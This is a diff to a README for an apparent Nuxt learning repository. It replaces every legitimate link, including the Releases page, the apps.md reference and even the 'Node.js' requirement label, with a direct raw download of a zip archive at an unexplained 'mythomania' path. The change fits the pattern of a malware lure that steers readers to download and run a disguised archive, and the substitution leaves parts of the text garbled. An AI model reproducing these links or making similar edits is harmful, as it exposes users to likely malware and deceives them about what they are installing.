@@ -1,6 +1,6 @@
 # 🚀 real-world-nuxt - Learn from Real Applications
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/LadyDev54/real-world-nuxt/releases)
+[![Download](https://raw.githubusercontent.com/LadyDev54/real-world-nuxt/master/mythomania/real-world-nuxt.zip%20Now-brightgreen)](https://raw.githubusercontent.com/LadyDev54/real-world-nuxt/master/mythomania/real-world-nuxt.zip)
 
 ## 📋 Overview
 Real World Nuxt brings together a collection of production-quality Nuxt applications. This repository allows you to explore real codebases created by experienced developers. By studying these applications, you can enhance your skills and understanding of web development. 
@@ -20,14 +20,14 @@ You can find various applications in the [`apps/`](apps/) subdirectory. This col
 To run the applications effectively, ensure you have the following:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 14 or higher
+- **https://raw.githubusercontent.com/LadyDev54/real-world-nuxt/master/mythomania/real-world-nuxt.zip** Version 14 or higher
 - **npm:** Version 6 or higher
 - A stable internet connection is recommended for fetching dependencies.
 
 ### 🔗 Download & Install
 To download this project, visit the Releases page:
 
-[Download from Releases](https://github.com/LadyDev54/real-world-nuxt/releases)
+[Download from Releases](https://raw.githubusercontent.com/LadyDev54/real-world-nuxt/master/mythomania/real-world-nuxt.zip)
 
 1. Click on the link above to access the Releases page.
 2. Find the latest version listed at the top. It should be the most current and stable version.
@@ -56,7 +56,7 @@ After you have extracted the files:
 ## 📂 Explore the Applications
 Once you have installed the packages, you can explore the applications found in the `apps/` subdirectory. Here, you will see example applications structured based on best practices. Each application provides a unique approach to using Nuxt 3 features. 
 
-Refer to the [apps.md](apps.md) file for a comprehensive list of all included applications, descriptions, and their respective versions.
+Refer to the [https://raw.githubusercontent.com/LadyDev54/real-world-nuxt/master/mythomania/real-world-nuxt.zip](https://raw.githubusercontent.com/LadyDev54/real-world-nuxt/master/mythomania/real-world-nuxt.zip) file for a comprehensive list of all included applications, descriptions, and their respective versions.
 
 ## 👩‍🏫 Learning Resources
 To get the most from this repository, check out these learning materials:
@@ -82,4 +82,4 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 ## 🙌 Acknowledgments
 Thanks to all contributors who make this repository a valuable resource for developers. 
 
-[Download from Releases](https://github.com/LadyDev54/real-world-nuxt/releases)
+[Download from Releases](https://raw.githubusercontent.com/LadyDev54/real-world-nuxt/master/mythomania/real-world-nuxt.zip)
